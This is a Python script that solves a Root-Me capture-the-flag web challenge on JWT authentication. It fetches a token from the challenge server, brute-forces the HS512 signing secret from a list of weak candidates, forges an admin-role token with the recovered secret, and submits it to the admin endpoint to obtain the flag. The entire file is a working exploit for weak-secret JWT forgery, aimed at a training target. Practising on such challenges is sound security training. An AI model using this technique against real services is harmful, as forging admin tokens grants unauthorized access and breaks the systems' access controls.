import jwt
from jwt.exceptions import InvalidSignatureError

import requests
import json


def get_jwt_token():
    response = requests.get('http://challenge01.root-me.org/web-serveur/ch59/token')
    jwt_token = json.loads(response.text)['Here is your token']

    return jwt_token


def get_flag(hacked_jwt_token):
    response = requests.post('http://challenge01.root-me.org/web-serveur/ch59/admin',
                             headers={'Authorization': f'Bearer {hacked_jwt_token}'})
    flag = json.loads(response.text)['result']

    return flag


def brute_secret():
    jwt_token = get_jwt_token()
    weak_secrets = ['secret', 'admin', 'weak-secret', 'super-crypto', 'super-secret', 'lol', 'super-crypto-secret']

    for secret in weak_secrets:
        try:
            jwt.decode(jwt_token, secret, algorithms=['HS512'])
            print(f'Secret is {secret}!')

            return secret
        except InvalidSignatureError:
            continue


def hack_jwt_token(secret):
    hacked_jwt_token = jwt.encode({'role': 'admin'}, secret, algorithm='HS512')

    return hacked_jwt_token.decode('utf-8')


def main():
    secret = brute_secret()
    hacked_jwt_token = hack_jwt_token(secret)
    flag = get_flag(hacked_jwt_token)

    print(flag)


if __name__ == '__main__':
    main()
